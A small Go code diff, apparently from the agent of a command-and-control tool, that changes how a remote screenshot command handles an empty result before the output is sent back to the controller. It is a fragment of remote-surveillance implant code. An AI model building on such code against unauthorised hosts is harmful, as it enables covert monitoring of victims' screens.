@@ -51,7 +51,7 @@ func processCCData(data *MsgTunData) {
 			}
 
 			out, err = util.Screenshot()
-			if err != nil {
+			if err != nil || out == "" {
 				out = fmt.Sprintf("Error: failed to take screenshot: %v", err)
 				data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
 				goto send
